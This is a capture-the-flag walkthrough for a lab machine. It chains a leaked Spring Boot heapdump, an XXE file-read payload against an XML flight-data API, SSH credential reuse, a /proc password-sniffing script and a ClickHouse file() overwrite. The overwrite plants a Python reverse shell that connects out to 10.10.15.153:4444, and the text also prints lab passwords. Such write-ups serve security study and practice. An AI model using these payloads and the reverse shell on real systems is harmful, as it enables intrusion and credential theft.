Stream

Medium

Linux (Ubuntu 24.04)

Exploited an exposed Spring Boot Actuator heapdump to recover ClickHouse credentials, leveraged XXE in the AIDX flight-leg ingest API to read Kafka configuration, reused the SASL password for an SSH foothold as svc-infra, then abused a root systemd timer and ClickHouse file() write to obtain a root shell.

Vulnerabilities
XXE Heapdump Leak Credential Reuse ClickHouse File Write
Tools Used
nmap curl strings python3

Summary

  • Discovered an exposed Spring Boot Actuator /actuator/heapdump on api.htb-airport.htb and extracted clear-text ClickHouse credentials (svc_events:Yl4aCgh4y2PnU).
  • Confirmed XXE in the AIDX flight-leg ingest API (port 8081) caused by a misconfigured lxml parser (resolve_entities=True, no_network=False).
  • Used a carefully structured XXE payload that lands expanded file content into the RemarkFreeText field, then retrieved it from ClickHouse.
  • Read Kafka server.properties via XXE and recovered the SASL password for svc_infra, which was reused as the OS password for SSH.
  • Escalated to root by abusing the root-owned aidx-dlq-drainer.timer, sniffing the ClickHouse default password from /proc, and overwriting the Python formatter with ClickHouse file() arbitrary write.

Port Scan

Started with a service/version scan on the target.

$ nmap -sC -sV 10.129.134.160

Three open ports. Port 80 is a reverse-proxy front for virtual hosts; port 8081 is the primary attack surface (AIDX XML ingest).

Hosts File

Port 80 returns a 301 redirect to api.htb-airport.htb. Added the required virtual hosts:

XXE — Arbitrary File Read

The AIDX ingest endpoint uses lxml with a dangerous configuration (resolve_entities=True, no_network=False). A minimal payload is accepted but the expanded entity only appears in ClickHouse when the message remains structurally valid after expansion. Placing the entity inside a free-text field solves this:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY read SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ Version="22.1" TimeStamp="2026-10-16T12:00:00Z"
  TransactionIdentifier="xxe-test" TransactionStatusCode="Update">
  <Originator CompanyShortName="TEST" Code="XX"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline>XX</Airline>
      <FlightNumber>1</FlightNumber>
      <DepartureAirport>AAA</DepartureAirport>
      <ArrivalAirport>BBB</ArrivalAirport>
      <OriginDate>2026-10-16</OriginDate>
    </LegIdentifier>
    <LegData>
      <RemarkFreeText>&read;</RemarkFreeText>
    </LegData>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>

Send and retrieve from ClickHouse:

$ curl -s -X POST http://10.129.134.160:8081/feeds/aidx \
  -H "Content-Type: application/xml" --data-binary @better_xxe.xml
sleep 25
$ curl -s "http://db.htb-airport.htb/?user=svc_events&password=Yl4aCgh4y2PnU&query=SELECT%20*%20FROM%20partner_feed.flightleg_json%20WHERE%20transaction_id=%27xxe-test%27"

The expanded /etc/passwd content appears inside the RemarkFreeText field, confirming successful XXE.

Kafka Credential Extraction

Repeated the same technique against the Kafka configuration file:

file:///opt/kafka_2.13-4.3.1/config/server.properties

Key lines recovered:

listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093

The SASL password for svc_infra is Ny2hdpme$bwT3. The PLAINTEXT listener requires no authentication and is only bound to localhost.

Privilege Escalation — Root Systemd Timer

Local enumeration revealed a root-owned timer that runs every two minutes:

$ systemctl list-timers --all | grep aidx
aidx-dlq-drainer.timer  →  aidx-dlq-drainer.service

The service executes:

/usr/bin/python3 /opt/ops/dlq_drainer.py

Key behaviour of the script:

  • Consumes from the Kafka topic aidx.flightleg.dlq.v1 (PLAINTEXT, no authentication).
  • Invokes python3 on the formatter script located at /var/lib/clickhouse/user_files/aidx_quarantine.py.
  • Calls clickhouse-client --user default --password <secret>, making the password briefly visible in /proc/<pid>/cmdline.

/proc Race — Capture ClickHouse Default Password

Started a background sniffer that watches for the password in process arguments:

python3 -c '
import os, re, time
pat = re.compile(rb"--password\x00([^\x00]+)")
while True:
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            data = open(f"/proc/{pid}/cmdline", "rb").read()
            if b"clickhouse-client" in data and b"--password" in data:
                m = pat.search(data)
                if m:
                    print("[+] PASSWORD:", m.group(1).decode())
                    open("/tmp/ch_pass.txt","w").write(m.group(1).decode())
                    exit(0)
        except: pass
    time.sleep(0.05)
' &

Triggered a DLQ message so the timer would process something:

python3 -c '
from confluent_kafka import Producer
p = Producer({"bootstrap.servers": "localhost:9092"})
p.produce("aidx.flightleg.dlq.v1", value=b"<trigger>test</trigger>", headers=[("reason", b"test")])
p.flush(10)
print("[+] DLQ message sent")
'

Within approximately two minutes the sniffer captured:

[+] PASSWORD: N3v3rs33nD4T4

ClickHouse Arbitrary File Write

With the default user password it is possible to overwrite any file under the ClickHouse user_files directory using the file() table function:

clickhouse-client --user default --password 'N3v3rs33nD4T4' --query "
INSERT INTO TABLE FUNCTION file('aidx_quarantine.py', 'RawBLOB')
SETTINGS engine_file_truncate_on_insert=1
FORMAT RawBLOB
" <<< 'import os,socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.153",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
'

Key Takeaways

  • Exposed Spring Boot Actuator heapdumps are gold mines — Clear-text credentials, connection strings and secrets frequently live in the JVM heap.
  • XXE is still highly effective when the parser is misconfigured and the expanded content can be retrieved from a downstream store such as ClickHouse.
  • Credential reuse between infrastructure components and OS accounts is common in data-pipeline environments; the Kafka SASL password was identical to the svc-infra login.
  • Secrets passed as command-line arguments are world-readable via /proc/<pid>/cmdline — a classic race condition that yields the ClickHouse default password.
  • ClickHouse file() + engine_file_truncate_on_insert provides a powerful arbitrary file write primitive once the default user password is known.
  • A root systemd timer that blindly executes a writable Python script is a textbook privilege-escalation vector once you can control the script contents.
